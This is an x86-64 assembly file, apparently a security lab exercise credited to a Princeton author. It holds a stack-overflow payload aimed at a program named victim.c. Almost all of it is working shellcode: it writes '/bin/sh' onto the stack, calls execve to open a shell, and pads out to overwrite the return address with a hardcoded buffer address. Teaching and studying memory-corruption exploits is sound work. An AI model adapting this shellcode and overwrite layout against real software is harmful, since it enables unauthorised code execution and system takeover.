/* victim.c */
/* Author: Zecheng He @ Princeton University */
/Payload (write to stack) to invoke a shell in victim.c/

#include <sys/syscall.h>

#define buffer 0x7fffffffe910
#define ADD(X, Y) (X + Y)

.globl main
        .type   main, @function

main:

        xor     %rcx, %rcx
        xor     $0x7fff, %cx
        shl     $32, %rcx

        xor     %rax, %rax
        xor     $ADD(buffer, 57), %eax   /* lower part of ptr to str "/bin/sh" */
        xor     %rax, %rcx               /* ptr to str "/bin/sh" */

        xor     %rax, %rax
        mov     %al, 7(%rcx)             /* Add '\0' to "/bin/sh" */
        movq    %rcx, 8(%rcx)            /* Ptr to ['/bin/sh'] */
        //movq    %rax, 12(%rcx)           /* NULL pointer */

        mov     $59, %al                 /* syscall arg 1: syscall number execve(59) */
        movq    %rcx, %rdi               /* syscall arg 2: string pathname */
        leaq    8(%rcx), %rsi            /* syscall arg 3: argv ptr to ['/bin/sh']*/
        xor     %rdx, %rdx               /* syscall arg 4: envp (NULL) */
        syscall                          /* Call execve("/bin/sh", ["/bin/sh"], []) */

        xor     %rax, %rax
        mov     $60, %al                 /* syscall arg 1: SYS_exit (60) */
        xorq    %rdi,%rdi                /* syscall arg 2: 0 */
        syscall                          /* invoke syscall */

        .ascii  "/bin/sh"
        .ascii  "aaaaaa"
        .ascii  "bbbb"
        .ascii  "cccc"
        .ascii  "dddd"
        .ascii  "eeee"
        .ascii  "ff"
        // .ascii  "gggg"
        .quad   buffer                   /* buffer ptr (the first instruction of payload), will overwrite real return address */
